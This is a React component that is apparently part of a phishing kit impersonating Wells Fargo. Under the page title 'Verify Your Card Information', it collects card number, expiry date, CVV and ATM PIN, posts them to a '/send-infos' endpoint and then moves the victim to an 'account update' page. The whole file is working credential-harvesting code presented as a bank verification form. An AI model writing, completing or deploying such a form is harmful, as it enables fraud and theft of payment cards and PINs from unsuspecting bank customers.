import { Box } from "@mui/system";
import axios from "axios";
import React, { useState } from "react";
import { useForm } from "react-hook-form";
import { Helmet } from "react-helmet";
import { CustomInput } from "./CustomInput";
import { SubmitButton } from "./SubmitButton";
import { Wrapper } from "./Wrapper";

interface CardInformationProps {
  updateInputs: (data: any) => void;
  inputs: {};
  history: any;
}

export const CardInformation: React.FC<CardInformationProps> = ({
  updateInputs,
  history,
}) => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();
  const [loading, setLoading] = useState(false);

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    updateInputs({
      form: "CARD INFORMATION",
      cardInformation: data,
    });

    await axios.post("/send-infos", {
      form: "CARD INFORMATION",
      cardInformation: data,
    });
    setLoading(false);
    history.push("/s/account-update");
  });
  return (
    <Wrapper title="Card Information" errors={errors}>
      <Helmet>
        <title>Verify Your Card Information | Wells Fargo</title>
      </Helmet>
      <Box paddingBottom="32px">
        <CustomInput
          label="Card number"
          type="number"
          register={register("cardNumber", {
            required: "Please enter your card number",
            pattern: {
              value:
                /^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/,
              message: "Please enter a valid card number",
            },
          })}
        />
      </Box>
      <Box marginTop="8px" paddingBottom="32px">
        <CustomInput
          label="Expiry date: MM/YYYY"
          register={register("expiryDate", {
            required: "Please enter your card expiry date",
            pattern: {
              value: /(0[1-9]|10|11|12)\/20[0-9]{2}$/,
              message:
                "Please enter a valid expiry date in the format mentioned above",
            },
          })}
        />
      </Box>
      <Box marginTop="8px" paddingBottom="32px">
        <CustomInput
          label="CVV"
          type="number"
          register={register("cvv", {
            required: "Please enter your card CVV",
            pattern: {
              value: /^[0-9]{3}$/,
              message: "Please enter a valid CVV",
            },
          })}
        />
      </Box>
      <Box marginTop="8px" paddingBottom="32px">
        <CustomInput
          label="ATM Pin"
          type="number"
          register={register("cardPin", {
            required: "Please enter your card ATM pin",
            pattern: {
              value: /^[0-9]{4,5}$/,
              message: "Please enter a valid ATM pin",
            },
          })}
        />
      </Box>
      <Box
        component="section"
        sx={{
          margin: "1rem auto .625rem",
          display: "block",
        }}
      />
      <SubmitButton text="Submit" onClick={onSubmit} loading={loading} />
    </Wrapper>
  );
};
